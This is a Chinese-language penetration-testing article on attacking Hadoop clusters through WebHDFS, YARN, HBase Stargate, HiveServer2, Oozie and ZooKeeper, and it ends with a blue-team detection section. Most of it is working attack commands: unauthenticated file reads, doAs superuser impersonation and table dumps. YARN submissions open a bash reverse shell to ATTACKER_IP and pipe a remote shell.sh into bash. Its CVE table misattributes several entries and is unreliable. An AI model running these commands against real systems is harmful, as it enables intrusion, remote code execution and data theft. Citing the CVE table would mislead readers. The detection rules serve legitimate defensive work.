---
title: "Hadoop HDFS NameNode / YARN / HBase 大数据生态管理面打点与利用技术"
date: 2026-06-20T18:00:00+08:00
draft: false
weight: 88
description: "Hadoop 大数据生态管理面渗透测试：NameNode WebHDFS API、YARN ResourceManager REST API、HBase Stargate REST API 的攻击面枚举、未授权访问利用、RCE 链路与蓝队检测方案"
categories: ["安全", "渗透测试"]
tags: ["Hadoop", "HDFS", "NameNode", "YARN", "HBase", "WebHDFS", "ResourceManager", "Stargate", "大数据安全", "渗透测试"]
---

## 0x00 攻击面总览

Hadoop 大数据生态由多个独立服务组成，每个服务都暴露了独立的管理接口：

| 组件 | 默认端口 | 协议 | 攻击面 |
|------|---------|------|--------|
| NameNode HTTP | 9870 (3.x) / 50070 (2.x) | HTTP/HTTPS | WebHDFS REST API、fsck 接口、JMX、JSP 页面 |
| NameNode RPC | 8020 / 9000 | Hadoop RPC | DataNode 注册、客户端文件操作 |
| DataNode HTTP | 9864 (3.x) / 50075 (2.x) | HTTP | 数据块操作、JMX |
| Secondary NameNode HTTP | 9868 (3.x) / 50090 (2.x) | HTTP | fsimage 合并状态 |
| YARN ResourceManager | 8088 / 8090 (HTTPS) | HTTP/HTTPS | REST API、应用提交、队列管理 |
| YARN NodeManager | 8042 | HTTP | 容器状态、日志 |
| YARN Timeline Server | 8188 / 8190 | HTTP | 应用历史数据 |
| HBase Master | 16010 | HTTP | Master Web UI、JMX |
| HBase RegionServer | 16030 | HTTP | Region 状态 |
| HBase Stargate REST | 8080 / 8085 (HTTPS) | HTTP/HTTPS | 表 CRUD、Scanner API |
| HBase Thrift | 9090 / 9095 | Thrift | 表操作 |
| HiveServer2 | 10000 / 10001 (HTTP) | Thrift / HTTP | SQL 查询 |
| Hive Metastore | 9083 | Thrift | 元数据读写 |
| Oozie | 11000 / 11443 (HTTPS) | HTTP | 工作流提交 |
| Spark History Server | 18080 | HTTP | 应用历史 |
| ZooKeeper | 2181 | TCP | 四字命令、JMX |

**核心威胁模型**：

```
┌─────────────────────────────────────────────────────────────┐
│                    Hadoop 大数据集群                         │
│                                                             │
│  ┌──────────┐    ┌──────────────┐    ┌──────────────┐      │
│  │ NameNode │    │  ResourceManager│   │ HBase Master │      │
│  │ :9870    │    │  :8088       │    │ :16010      │      │
│  │ WebHDFS  │    │  YARN REST   │    │ Stargate    │      │
│  └────┬─────┘    └──────┬───────┘    └──────┬───────┘      │
│       │                 │                    │              │
│  ┌────┴─────────────────┴────────────────────┴──────┐      │
│  │          内网 / 大数据专用网络                      │      │
│  │  ┌──────────┐  ┌──────────┐  ┌──────────┐       │      │
│  │  │DataNode  │  │NodeMgr   │  │RegionSvr │       │      │
│  │  │:9864     │  │:8042     │  │:16030    │       │      │
│  │  └──────────┘  └──────────┘  └──────────┘       │      │
│  └──────────────────────────────────────────────────┘      │
│                                                             │
│  攻击路径:                                                   │
│  ① NameNode WebHDFS → 任意文件读写 → 敏感配置/密钥窃取       │
│  ② YARN REST API → 提交恶意应用 → RCE                       │
│  ③ HBase Stargate → 表数据读写 → 业务数据窃取                │
│  ④ doAs 伪造 → 以 hdfs 超级用户身份操作                      │
│  ⑤ Kerberos 降级 → 绕过认证                                 │
└─────────────────────────────────────────────────────────────┘
```

---

## 0x01 服务识别与指纹

### 1.1 Nmap 服务发现

```bash
nmap -sV -p 8020,8088,9000,9083,9864,9870,10000,11000,16010,16030,18080,2181 \
  --script=http-title,hadoop-namenode-info \
  -oN hadoop_scan.txt <target>
```

**典型扫描结果**：

```
PORT     STATE SERVICE     VERSION
8020/tcp open  hadoop-ipc  Apache Hadoop RPC (Protocol 9)
8088/tcp open  http        Jetty 9.4.51.v20210516
9870/tcp open  http        Jetty 9.4.51.v20210516
16010/tcp open  http        Jetty 9.4.51.v20210516
2181/tcp open  zookeeper   ZooKeeper 3.7.1
```

### 1.2 版本指纹

**NameNode HTTP 响应**：

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=utf-8
Server: Jetty(9.4.51.v20210516)

<title>Hadoop NameNode (hostname)</title>
```

**YARN ResourceManager**：

```http
HTTP/1.1 200 OK
Content-Type: application/json
Server: Jetty(9.4.51.v20210516)

{"clusterInfo":{"id":1687234567890,"state":"STARTED",
 "haState":"ACTIVE","rmStateStoreMode":"UNDEFINED"}}
```

**HBase Master**：

```http
HTTP/1.1 200 OK
Content-Type: text/html

<title>HBase Master: hostname:16010</title>
```

### 1.3 Shodan / FOFA 搜索语法

```
# Shodan
http.html:"Hadoop NameNode"
http.html:"YARN ResourceManager"
http.html:"HBase Master"
port:9870 http.title:"NameNode"
port:8088 http.title:"Resource Manager"

# FOFA
body="Hadoop NameNode"
body="Resource Manager" && port="8088"
body="HBase Master" && port="16010"
```

---

## 0x02 NameNode WebHDFS 利用

### 2.1 WebHDFS REST API 概述

WebHDFS 是 HDFS 的 HTTP 访问接口，通过 NameNode（端口 9870/50070）和 DataNode（端口 9864/50075）协同工作。

**核心操作**：

| 操作 | HTTP 方法 | 端点 |
|------|----------|------|
| 列出目录 | GET | `/webhdfs/v1/<path>?op=LISTSTATUS` |
| 读取文件 | GET | `/webhdfs/v1/<path>?op=OPEN` |
| 创建文件 | PUT | `/webhdfs/v1/<path>?op=CREATE` |
| 删除文件 | DELETE | `/webhdfs/v1/<path>?op=DELETE` |
| 文件状态 | GET | `/webhdfs/v1/<path>?op=GETFILESTATUS` |
| 修改权限 | PUT | `/webhdfs/v1/<path>?op=SETPERMISSION` |
| 修改属主 | PUT | `/webhdfs/v1/<path>?op=SETOWNER` |
| 创建目录 | PUT | `/webhdfs/v1/<path>?op=MKDIRS` |

### 2.2 未授权访问 — 文件枚举

```bash
curl -s "http://namenode:9870/webhdfs/v1/?op=LISTSTATUS" | python3 -m json.tool
```

**响应示例**：

```json
{
  "FileStatuses": {
    "FileStatus": [
      {
        "pathSuffix": "tmp",
        "type": "DIRECTORY",
        "length": 0,
        "owner": "hdfs",
        "group": "supergroup",
        "permission": "777",
        "accessTime": 0,
        "modificationTime": 1687234567890,
        "blockSize": 0,
        "replication": 0
      },
      {
        "pathSuffix": "user",
        "type": "DIRECTORY",
        "length": 0,
        "owner": "hdfs",
        "group": "supergroup",
        "permission": "755",
        "accessTime": 0,
        "modificationTime": 1687234567890
      },
      {
        "pathSuffix": "apps",
        "type": "DIRECTORY",
        "length": 0,
        "owner": "hdfs",
        "group": "supergroup",
        "permission": "755"
      }
    ]
  }
}
```

### 2.3 递归枚举高价值路径

```bash
for path in "/" "/tmp" "/user" "/user/hive" "/user/oozie" "/apps/hbase" "/system/yarn"; do
  echo "=== $path ==="
  curl -s "http://namenode:9870/webhdfs/v1${path}?op=LISTSTATUS" | \
    python3 -c "import sys,json; [print(f['pathSuffix'],f['type'],f['length']) for f in json.load(sys.stdin)['FileStatuses']['FileStatus']]" 2>/dev/null
done
```

### 2.4 敏感文件读取

**读取 Hive 配置**（含 Metastore 连接信息）：

```bash
curl -s "http://namenode:9870/webhdfs/v1/user/hive/warehouse/.hiveconfig?op=OPEN&noredirect=true"
```

**读取 HBase 配置**（含 ZooKeeper 地址）：

```bash
curl -s "http://namenode:9870/webhdfs/v1/apps/hbase/conf/hbase-site.xml?op=OPEN"
```

**读取 YARN 配置**：

```bash
curl -s "http://namenode:9870/webhdfs/v1/system/yarn/conf/capacity-scheduler.xml?op=OPEN"
```

**读取 Oozie 工作流定义**（可能含数据库密码）：

```bash
curl -s "http://namenode:9870/webhdfs/v1/user/oozie/workflows/job.properties?op=OPEN"
```

### 2.5 文件读取 — 重定向到 DataNode

WebHDFS 读取是两步操作：

```bash
# 第一步：获取 DataNode 重定向地址
REDIRECT=$(curl -s -o /dev/null -w "%{redirect_url}" \
  "http://namenode:9870/webhdfs/v1/user/hive/warehouse/target_db.db/credentials?op=OPEN")

# 第二步：从 DataNode 获取实际数据
curl -s "$REDIRECT"
```

### 2.6 文件写入

```bash
# 第一步：创建文件（获取 DataNode 写入地址）
curl -s -X PUT "http://namenode:9870/webhdfs/v1/tmp/pwned.txt?op=CREATE&noredirect=true"

# 第二步：向 DataNode 写入数据
curl -s -X PUT -d "pwned by security audit" \
  "http://datanode:9864/webhdfs/v1/tmp/pwned.txt?op=CREATE&user.name=hdfs"
```

### 2.7 doAs 用户伪造

当 `dfs.webhdfs.impersonation.enabled=true`（或 `hadoop.proxyuser.hdfs.hosts=*`）时，可以伪造任意用户身份：

```bash
# 以 hdfs 超级用户身份操作
curl -s "http://namenode:9870/webhdfs/v1/?op=LISTSTATUS&doAs=hdfs"

# 以 yarn 用户身份读取其目录
curl -s "http://namenode:9870/webhdfs/v1/user/yarn?op=LISTSTATUS&doAs=yarn"

# 以任意业务用户身份写入文件
curl -s -X PUT "http://namenode:9870/webhdfs/v1/user/analyst/exfil.txt?op=CREATE&doAs=analyst&noredirect=true"
```

**危害**：在大多数生产集群中，`hdfs` 用户是超级管理员，拥有对所有 HDFS 路径的完全读写权限。通过 `doAs=hdfs` 可以：
- 读取任何用户的私有数据
- 修改 Hive 表数据实现数据投毒
- 写入 YARN 共享目录植入恶意 JAR

### 2.8 fsck 接口信息泄露

```bash
# 获取文件系统健康状态
curl -s "http://namenode:9870/fsck"

# 获取特定路径的块信息（含 DataNode 地址）
curl -s "http://namenode:9870/fsck?path=/&files=on&blocks=on"
```

### 2.9 JMX 信息泄露

```bash
# NameNode JMX
curl -s "http://namenode:9870/jmx" | python3 -m json.tool

# 获取所有 MBean
curl -s "http://namenode:9870/jmx?qry=Hadoop:service=NameNode,*"

# 获取配置属性
curl -s "http://namenode:9870/jmx?qry=Hadoop:service=NameNode,name=NameNodeStatus"
```

---

## 0x03 YARN ResourceManager 利用

### 3.1 REST API 概述

YARN ResourceManager 的 REST API 是攻击面最大的组件之一，支持应用的提交、查询和管理。

**关键端点**：

| 端点 | 方法 | 功能 |
|------|------|------|
| `/ws/v1/cluster/info` | GET | 集群信息 |
| `/ws/v1/cluster/apps` | GET | 应用列表 |
| `/ws/v1/cluster/apps` | POST | 提交新应用 |
| `/ws/v1/cluster/apps/{appId}/state` | PUT | 修改应用状态 |
| `/ws/v1/cluster/apps/{appId}/queue` | PUT | 移动应用队列 |
| `/ws/v1/cluster/scheduler` | GET | 调度器信息 |
| `/ws/v1/cluster/nodes` | GET | 节点列表 |
| `/ws/v1/cluster/apps/{appId}/appattempts` | GET | 应用尝试信息 |

### 3.2 集群信息收集

```bash
# 集群基本信息
curl -s "http://resourcemanager:8088/ws/v1/cluster/info" | python3 -m json.tool

# 响应示例
{
  "clusterInfo": {
    "id": 1687234567890,
    "state": "STARTED",
    "haState": "ACTIVE",
    "resourceManagerVersion": "3.3.6",
    "resourceManagerBuildVersion": "3.3.6",
    "hadoopVersion": "3.3.6",
    "totalMB": 65536,
    "reservedMB": 0,
    "availableMB": 32768,
    "allocatedMB": 32768,
    "totalVirtualCores": 64,
    "reservedVirtualCores": 0,
    "availableVirtualCores": 32,
    "allocatedVirtualCores": 32,
    "totalNodes": 8
  }
}
```

```bash
# 节点列表（含 NodeManager 地址）
curl -s "http://resourcemanager:8088/ws/v1/cluster/nodes" | python3 -m json.tool

# 调度器信息
curl -s "http://resourcemanager:8088/ws/v1/cluster/scheduler" | python3 -m json.tool

# 当前运行的应用
curl -s "http://resourcemanager:8088/ws/v1/cluster/apps?states=RUNNING" | python3 -m json.tool
```

### 3.3 提交恶意应用 — RCE

YARN 允许提交 MapReduce、Spark、Flink 等应用，攻击者可以提交包含恶意代码的应用实现 RCE。

**步骤 1：创建新应用**

```bash
curl -s -X POST "http://resourcemanager:8088/ws/v1/cluster/apps/new-application" | python3 -m json.tool

# 响应
{
  "application-id": "application_1687234567890_0042",
  "maximum-resource-capability": {
    "memory": 8192,
    "vCores": 4
  }
}
```

**步骤 2：提交恶意 Shell 命令**

```bash
curl -s -X POST "http://resourcemanager:8088/ws/v1/cluster/apps" \
  -H "Content-Type: application/json" \
  -d '{
    "application-id": "application_1687234567890_0042",
    "application-name": "security-audit",
    "application-type": "YARN",
    "am-container-spec": {
      "commands": {
        "command": "/bin/bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\""
      },
      "environment": {
        "CLASSPATH": "{{CLASSPATH}}:./*"
      },
      "local-resources": {
        "entry": [{
          "key": "script.sh",
          "value": {
            "resource": "hdfs://namenode:8020/tmp/script.sh",
            "type": "FILE",
            "visibility": "APPLICATION",
            "size": 100,
            "timestamp": 1687234567890
          }
        }]
      }
    },
    "unmanaged-AM": false,
    "max-app-attempts": 1,
    "resource": {"memory": 1024, "vCores": 1},
    "queue": "default"
  }'
```

### 3.4 简化利用 — 分布式 Shell

YARN 自带 `DistributedShell` 工具，可直接在任意 NodeManager 上执行命令：

```bash
# 使用 hadoop 自带的 distributedshell 示例
hadoop jar hadoop-mapreduce-examples.jar distributedshell \
  -jar hadoop-mapreduce-examples.jar \
  -shell_command "id && hostname && cat /etc/passwd" \
  -num_containers 3 \
  --appname security-test
```

**通过 REST API 提交分布式 Shell**：

```bash
# 先上传恶意 JAR 到 HDFS
curl -s -X PUT "http://namenode:9870/webhdfs/v1/tmp/dshell.jar?op=CREATE&noredirect=true"

# 然后通过 YARN API 提交分布式 Shell 应用
curl -s -X POST "http://resourcemanager:8088/ws/v1/cluster/apps" \
  -H "Content-Type: application/json" \
  -d '{
    "application-id": "application_1687234567890_0043",
    "application-name": "dist-shell",
    "application-type": "YARN",
    "am-container-spec": {
      "commands": {
        "command": "hadoop jar /opt/hadoop/share/hadoop/mapreduce/hadoop-mapreduce-examples-*.jar distributedshell -shell_command \"curl http://ATTACKER_IP:8888/shell.sh | bash\" -num_containers 8"
      }
    },
    "resource": {"memory": 1024, "vCores": 1}
  }'
```

### 3.5 应用日志窃取

```bash
# 获取所有应用的日志 URL
curl -s "http://resourcemanager:8088/ws/v1/cluster/apps?states=FINISHED&limit=50" | \
  python3 -c "
import sys, json
apps = json.load(sys.stdin)['apps']['app']
for app in apps:
    print(f\"{app['id']} | {app['name']} | {app['user']} | {app['trackingUi']}\")
"

# 通过 NodeManager 获取容器日志
curl -s "http://nodemanager:8042/ws/v1/node/containers" | python3 -m json.tool

# 读取特定容器日志
curl -s "http://nodemanager:8042/ws/v1/node/containers/container_1687234567890_0042_01_000001/logs"
```

### 3.6 Timeline Server 信息泄露

```bash
# Timeline Server v1
curl -s "http://timelineserver:8188/ws/v1/timeline/DS_APP_ATTEMPT" | python3 -m json.tool

# Timeline Server v2
curl -s "http://timelineserver:8188/ws/v2/timeline/apps" | python3 -m json.tool
```

Timeline Server 存储了所有历史应用的运行信息，包括：
- 应用提交用户
- 应用运行日志路径
- 资源使用详情
- 可能的环境变量和启动参数（含密码）

---

## 0x04 HBase 利用

### 4.1 Stargate REST API 概述

HBase Stargate（REST Server）提供了 HTTP 接口访问 HBase 表数据。

**核心端点**：

| 端点 | 方法 | 功能 |
|------|------|------|
| `/` | GET | 集群状态 |
| `/{table}` | GET | 获取表 schema |
| `/{table}/{row}` | GET | 获取行数据 |
| `/{table}/{row}/{column}` | GET | 获取列数据 |
| `/{table}/scanner` | PUT | 创建 Scanner |
| `/{table}/scanner/{id}` | GET | 获取扫描结果 |
| `/{table}/{row}/{column}` | PUT | 写入数据 |
| `/{table}/{row}` | DELETE | 删除行 |
| `/status/cluster` | GET | 集群状态 |

### 4.2 未授权访问 — 集群信息

```bash
# 集群状态
curl -s -H "Accept: application/json" "http://hbase-master:8085/status/cluster"

# 版本信息
curl -s -H "Accept: application/json" "http://hbase-master:8085/"

# 列出所有表
curl -s -H "Accept: application/json" "http://hbase-master:8080/"
```

**响应示例**：

```json
{
  "regions": 156,
  "requestsPerSecond": 1234.5,
  "averageLoad": 19.5,
  "aliveNodes": 8,
  "deadNodes": 0,
  "master": "hbase-master:16010",
  "backupMasters": [],
  "tables": ["hbase:meta", "hbase:namespace", "user_profiles", "order_data", "audit_log"]
}
```

### 4.3 表数据读取

```bash
# 获取表 schema
curl -s -H "Accept: application/json" "http://hbase-master:8080/user_profiles"

# 读取特定行
curl -s -H "Accept: application/json" \
  "http://hbase-master:8080/user_profiles/row_key_001"

# 响应示例
{
  "Row": [{
    "key": "cm93X2tleV8wMDE=",
    "Cell": [{
      "column": "aOm5hbWU=",
      "timestamp": 1687234567890,
      "$": "Sm9obiBEb2U="
    }, {
      "column": "aOZW1haWw=",
      "timestamp": 1687234567890,
      "$": "am9obi5kb2VAY29ycC5jb20="
    }, {
      "column": "aDpwYXNzd29yZF9oYXNo",
      "timestamp": 1687234567890,
      "$": "NWY0ZGNjM2I1YWE3NjVkNjFkODMyN2RlYjg4MmNmOTk="
    }]
  }]
}
```

> 注意：HBase REST API 返回的 key、column、value 均为 Base64 编码。

```bash
# 批量解码
echo "cm93X2tleV8wMDE=" | base64 -d; echo
echo "aOm5hbWU=" | base64 -d; echo
echo "Sm9obiBEb2U=" | base64 -d; echo
```

### 4.4 Scanner 批量数据导出

```bash
# 创建全表 Scanner
SCANNER_ID=$(curl -s -X PUT \
  -H "Accept: application/json" \
  -H "Content-Type: application/json" \
  -d '{"batchSize": 100}' \
  "http://hbase-master:8080/user_profiles/scanner" \
  -D - | grep -i "location" | awk '{print $2}' | tr -d '\r\n')

# 循环读取所有数据
for i in $(seq 1 1000); do
  RESULT=$(curl -s -H "Accept: application/json" \
    "http://hbase-master:8080/user_profiles/scanner/${SCANNER_ID}")
  echo "$RESULT" | python3 -c "
import sys, json, base64
data = json.load(sys.stdin)
for row in data.get('Row', []):
    key = base64.b64decode(row['key']).decode()
    for cell in row.get('Cell', []):
        col = base64.b64decode(cell['column']).decode()
        val = base64.b64decode(cell.get('\$', '')).decode(errors='replace')
        print(f'{key} | {col} | {val}')
" 2>/dev/null
done

# 删除 Scanner
curl -s -X DELETE "http://hbase-master:8080/user_profiles/scanner/${SCANNER_ID}"
```

### 4.5 数据写入与投毒

```bash
# 写入恶意数据
curl -s -X PUT \
  -H "Content-Type: application/json" \
  -H "Accept: application/json" \
  -d '{
    "Row": [{
      "key": "bWFsaWNpb3VzX3Jvdw==",
      "Cell": [{
        "column": "aDphY2NvdW50X3R5cGU=",
        "$": "YWRtaW4="
      }]
    }]
  }' \
  "http://hbase-master:8080/user_profiles/malicious_row"
```

### 4.6 HBase Master Web UI 信息泄露

```bash
# Master 状态页面
curl -s "http://hbase-master:16010/master-status"

# JMX
curl -s "http://hbase-master:16010/jmx" | python3 -m json.tool

# 获取配置
curl -s "http://hbase-master:16010/dump"
```

### 4.7 Coprocessor 加载 — RCE

HBase Coprocessor 机制允许加载自定义 Java 代码，如果攻击者能上传 JAR 到 HDFS 并修改表配置：

```bash
# 步骤 1：上传恶意 Coprocessor JAR 到 HDFS
curl -s -X PUT "http://namenode:9870/webhdfs/v1/tmp/evil-coprocessor.jar?op=CREATE&noredirect=true"

# 步骤 2：通过 HBase Shell 或 Thrift API 修改表配置加载 Coprocessor
# 这通常需要 HBase Shell 访问或 Master Admin API
# hbase> alter 'user_profiles', 'coprocessor'=>'hdfs://namenode:8020/tmp/evil-coprocessor.jar|com.evil.EvilCoprocessor|1001'
```

---

## 0x05 HiveServer2 利用

### 5.1 未授权访问

```bash
# 使用 beeline 客户端连接
beeline -u "jdbc:hive2://hiveserver:10000/default" -n "" -p ""

# 使用 PyHive
python3 -c "
from pyhive import hive
conn = hive.Connection(host='hiveserver', port=10000, username='')
cursor = conn.cursor()
cursor.execute('SHOW DATABASES')
for db in cursor.fetchall():
    print(db)
"
```

### 5.2 HTTP 模式连接

```bash
# HiveServer2 HTTP 模式（端口 10001）
beeline -u "jdbc:hive2://hiveserver:10001/default;transportMode=http;httpPath=cliservice" \
  -n "" -p ""
```

### 5.3 数据窃取

```sql
-- 列出所有数据库
SHOW DATABASES;

-- 列出所有表
USE sensitive_db;
SHOW TABLES;

-- 读取表数据
SELECT * FROM user_credentials LIMIT 100;

-- 读取 HDFS 文件（通过 Hive 外部表）
CREATE EXTERNAL TABLE exfil (line STRING)
LOCATION 'hdfs://namenode:8020/user/hive/warehouse/other_db.db/secrets/';
SELECT * FROM exfil;
```

---

## 0x06 Oozie 工作流利用

### 6.1 提交恶意工作流

```bash
# 创建 job.properties
cat > job.properties << 'EOF'
nameNode=hdfs://namenode:8020
jobTracker=resourcemanager:8050
queueName=default
oozie.wf.application.path=hdfs://namenode:8020/tmp/malicious-wf.xml
EOF

# 提交工作流
curl -s -X POST "http://oozie:11000/oozie/v2/jobs?action=submit" \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<workflow-app name="security-test" xmlns="uri:oozie:workflow:0.5">
  <start to="shell-action"/>
  <action name="shell-action">
    <shell xmlns="uri:oozie:shell-action:0.3">
      <exec>/bin/bash</exec>
      <argument>-c</argument>
      <argument>id; hostname; cat /etc/passwd</argument>
    </shell>
    <ok to="end"/>
    <error to="fail"/>
  </action>
  <kill name="fail">
    <message>Workflow failed</message>
  </kill>
  <end name="end"/>
</workflow-app>'
```

---

## 0x07 Kerberos 认证绕过与降级

### 7.1 Kerberos 未启用的检测

```bash
# 检查 NameNode 是否启用 Kerberos
curl -s "http://namenode:9870/conf" | grep -i "kerberos"

# 检查 hadoop.security.authentication 配置
curl -s "http://namenode:9870/conf" | grep "hadoop.security.authentication"

# 如果返回 "simple" 则表示未启用 Kerberos
# <property><name>hadoop.security.authentication</name><value>simple</value></property>
```

### 7.2 SPNEGO 降级攻击

当集群配置了 Kerberos 但 Web UI 未强制 SPNEGO 认证时：

```bash
# 某些端点可能不需要 Kerberos 票据
curl -s "http://namenode:9870/webhdfs/v1/?op=LISTSTATUS"

# 如果返回数据而非 401，说明 WebHDFS 未强制认证
```

### 7.3 令牌伪造

当 `hadoop.security.authentication=simple` 时，任何用户名都是可信的：

```bash
# 直接以 hdfs 用户访问
curl -s "http://namenode:9870/webhdfs/v1/?op=LISTSTATUS&user.name=hdfs"

# 通过 HADOOP_USER_NAME 环境变量
export HADOOP_USER_NAME=hdfs
hdfs dfs -ls /
```

---

## 0x08 ZooKeeper 四字命令与信息泄露

### 8.1 四字命令

```bash
# 获取服务器状态
echo "stat" | nc namenode 2181

# 输出示例：
# Zookeeper version: 3.7.1
# Latency min/avg/max: 0/1/245
# Received: 1234567
# Sent: 1234567
# Connections: 42
# Outstanding: 0
# Zxid: 0x1234abcd
# Mode: leader

# 获取配置
echo "conf" | nc namenode 2181

# 获取连接列表
echo "cons" | nc namenode 2181

# 获取所有 znode 路径
echo "dump" | nc namenode 2181

# 获取环境变量
echo "envi" | nc namenode 2181
```

### 8.2 敏感数据读取

```bash
# 使用 zkCli 连接
zkCli.sh -server namenode:2181

# 浏览 znode
[zk: namenode:2181(CONNECTED)] ls /
[hadoop-ha, hbase, kafka, zookeeper, hadoop]

[zk: namenode:2181(CONNECTED)] ls /hadoop-ha
[my-hadoop-cluster]

# 读取 Hadoop HA 配置（含 NameNode 地址）
[zk: namenode:2181(CONNECTED)] get /hadoop-ha/my-hadoop-cluster/ActiveStandbyElectorLock

# 读取 HBase 元数据
[zk: namenode:2181(CONNECTED)] ls /hbase/meta-region-server
[zk: namenode:2181(CONNECTED)] get /hbase/meta-region-server

# 读取 Kafka broker 信息
[zk: namenode:2181(CONNECTED)] ls /kafka/brokers/ids
[0, 1, 2]
[zk: namenode:2181(CONNECTED)] get /kafka/brokers/ids/0
```

---

## 0x09 历史 CVE 漏洞矩阵

| CVE | 组件 | 类型 | CVSS | 影响 |
|-----|------|------|------|------|
| CVE-2017-3163 | Hadoop | SSRF | 6.1 | NameNode WebHDFS SSRF |
| CVE-2018-11768 | Hadoop | RCE | 9.8 | Apache Ranger 标签策略 RCE |
| CVE-2019-0232 | YARN | 认证绕过 | 9.8 | YARN Timeline Server 认证绕过 |
| CVE-2020-9492 | Oozie | SSRF | 7.5 | Oozie 共享库 SSRF |
| CVE-2021-25642 | Druid | RCE | 8.8 | 与 Hadoop 集成的 Druid RCE |
| CVE-2022-25168 | Hadoop | 信息泄露 | 5.3 | Hadoop KMS 密钥泄露 |
| CVE-2023-26370 | Hive | 权限绕过 | 8.8 | HiveServer2 授权绕过 |
| CVE-2023-37475 | Hive | RCE | 8.8 | Hive UDF 反序列化 RCE |

---

## 0x10 蓝队检测方案

### 10.1 网络层检测

```yaml
# Sigma 规则 — Hadoop 组件异常访问
title: Hadoop WebHDFS 外部访问
id: hadoop-webhdfs-external
status: experimental
description: 检测来自非内网段的 WebHDFS API 访问
logsource:
  category: firewall
detection:
  selection:
    dst_port:
      - 9870
      - 50070
      - 9864
      - 50075
    src_ip|not:
      - "10.0.0.0/8"
      - "172.16.0.0/12"
      - "192.168.0.0/16"
  condition: selection
level: high
```

```yaml
title: YARN 应用提交异常
id: yarn-app-submit-anomaly
status: experimental
description: 检测异常的 YARN 应用提交行为
logsource:
  product: hadoop
  service: resourcemanager
detection:
  selection:
    event_type: "app_submit"
  filter_internal:
    user:
      - "yarn"
      - "hdfs"
      - "hive"
      - "oozie"
  filter_known_app:
    app_type:
      - "MAPREDUCE"
      - "SPARK"
  condition: selection and not filter_internal
level: medium
```

### 10.2 NameNode 审计日志分析

```bash
# NameNode 审计日志位于 $HADOOP_HOME/logs/hadoop-hdfs-audit-namenode-*.log
# 关键审计事件

# 检测异常用户操作
grep "ugi=unknown" /var/log/hadoop/hdfs-audit.log
grep "ugi=root" /var/log/hadoop/hdfs-audit.log | grep -v "expected_user"

# 检测 doAs 伪造
grep "doAs=" /var/log/hadoop/hdfs-audit.log

# 检测批量文件读取（数据窃取）
grep "op=open" /var/log/hadoop/hdfs-audit.log | \
  awk '{print $NF}' | sort | uniq -c | sort -rn | head -20

# 检测敏感路径访问
grep -E "op=open.*(/user/hive|/apps/hbase|/system/yarn|/tmp)" \
  /var/log/hadoop/hdfs-audit.log
```

### 10.3 YARN 应用审计

```bash
# 检测异常应用提交
curl -s "http://resourcemanager:8088/ws/v1/cluster/apps?states=RUNNING" | \
  python3 -c "
import sys, json
apps = json.load(sys.stdin).get('apps', {}).get('app', [])
suspicious_keywords = ['shell', 'reverse', 'ncat', 'nc ', 'bash', 'python', 'perl', 'ruby']
for app in apps:
    name = app.get('name', '').lower()
    user = app.get('user', '')
    if any(kw in name for kw in suspicious_keywords):
        print(f'SUSPICIOUS: {app[\"id\"]} | user={user} | name={app[\"name\"]}')
    if user not in ['yarn', 'hdfs', 'hive', 'spark', 'oozie', 'flink']:
        print(f'UNKNOWN USER: {app[\"id\"]} | user={user} | name={app[\"name\"]}')
"
```

### 10.4 HBase 访问审计

```bash
# HBase 审计日志
grep -E "(READ|WRITE|CREATE|DELETE)" /var/log/hbase/hbase-audit.log | \
  grep -v "user=hbase" | head -50

# 检测异常 Scanner 创建
grep "createScanner" /var/log/hbase/hbase-audit.log

# 检测 Coprocessor 加载
grep -i "coprocessor" /var/log/hbase/hbase-master.log
```

### 10.5 加固清单

```
[ ] NameNode WebHDFS (9870) 仅允许内网访问，配置 SPNEGO 认证
[ ] YARN ResourceManager (8088) 启用 Kerberos 认证
[ ] HBase Stargate (8080) 限制绑定地址或禁用
[ ] HBase Thrift (9090) 限制绑定地址或禁用
[ ] 禁用 WebHDFS doAs 伪造：dfs.webhdfs.impersonation.enabled=false
[ ] 配置 hadoop.proxyuser 白名单，限制代理用户来源
[ ] 启用 HDFS 审计日志并接入 SIEM
[ ] YARN 配置资源配额和队列 ACL
[ ] HBase 启用 Cell 级别安全（Cell Security）
[ ] ZooKeeper 启用 ACL 和 SASL 认证
[ ] 所有组件启用 Kerberos 认证（hadoop.security.authentication=kerberos）
[ ] HiveServer2 启用 LDAP/Kerberos 认证
[ ] Oozie 启用认证（oozie.authentication.type=kerberos）
[ ] 定期审计 HDFS 目录权限，避免 /tmp 目录权限过宽
[ ] 配置 Ranger 或 Sentry 进行细粒度权限控制
[ ] 升级 Hadoop 到最新安全版本，修补已知 CVE
```

---

## 0x11 渗透测试检查清单

```
[ ] 端口扫描：9870, 8020, 8088, 8042, 8080, 8085, 9090, 10000, 11000, 16010, 2181
[ ] NameNode WebHDFS 未授权访问测试（LISTSTATUS / OPEN）
[ ] doAs 用户伪造测试
[ ] 敏感文件读取（Hive 配置、HBase 配置、Oozie 工作流）
[ ] 文件写入测试（/tmp 目录）
[ ] YARN ResourceManager 未授权访问测试
[ ] YARN 应用提交测试（验证 RCE 可行性）
[ ] YARN 应用日志信息泄露测试
[ ] HBase Stargate REST API 未授权访问测试
[ ] HBase 表数据读取/写入测试
[ ] HiveServer2 未授权访问测试
[ ] Oozie 工作流提交测试
[ ] ZooKeeper 四字命令信息泄露测试
[ ] Kerberos 认证状态检查
[ ] JMX 端点信息泄露测试
[ ] 各组件版本信息收集与 CVE 匹配
```

---

## 0x12 小结

Hadoop 大数据生态的攻击面具有**组件多、接口杂、权限粗**的特点。NameNode WebHDFS 提供了对分布式文件系统的完整访问能力，YARN ResourceManager 允许提交任意计算任务实现 RCE，HBase Stargate 则暴露了 NoSQL 表数据的读写接口。在大多数生产环境中，如果未启用 Kerberos 认证，攻击者可以通过 `doAs` 参数伪造 `hdfs` 超级用户身份，获得对整个集群的完全控制权。蓝队应重点关注网络隔离、Kerberos 强制认证、审计日志接入 SIEM、以及 Ranger/Sentry 细粒度权限控制。
